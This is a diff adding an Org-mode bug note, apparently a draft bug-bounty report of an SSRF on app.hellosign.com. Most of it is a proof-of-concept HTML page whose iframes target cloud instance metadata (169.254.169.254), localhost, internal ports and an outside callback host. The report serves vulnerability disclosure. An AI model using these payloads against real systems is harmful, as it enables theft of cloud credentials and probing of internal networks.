@@ -1,0 +1,51 @@
+#+title: Bugs
+
+* SSRF On https://app.hellosign.com
+
+On the webapp app.hellosign.com I have discovered a SSRF.
+
+NOTE: update this before sending
+Here is an attached POC html
+#+begin_src html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Test</title>
+</head>
+<body>
+
+<h1>SSRF Test Page</h1>
+
+<p>This is a test page with a few iframes</p>
+<h1>Google</h1>
+<iframe src="https://google.com" width="800" height="600" frameborder="0"></iframe>
+
+<h1>Random</h1>
+<iframe src="https://programiz.pro" title="programiz pro website" height="500" width="500" ></iframe>
+
+<h1>instance metadata</h1>
+<iframe src="http://169.254.169.254/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0.0.0.0:80</h1>
+<iframe src="http://0.0.0.0:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0.0.0.0:443</h1>
+<iframe src="http://0.0.0.0:443" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0.0.0.0:22</h1>
+<iframe src="http://0.0.0.0:22" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: https://127.0.0.1/</h1>
+<iframe src="https://127.0.0.1/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: https://localhost/</h1>
+<iframe src="https://localhost/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0/</h1>
+<iframe src="http://0/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://169.254.169.254/latest/meta-data/</h1>
+<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600" frameborder="0"></iframe>
+
+
+<h1>Payload: SSRF advisor</h1>
+<iframe src="https://ncdn65fw.c5.rs" width="800" height="600" frameborder="0"></iframe>
+</body>
+</html>
+
+#+end_src
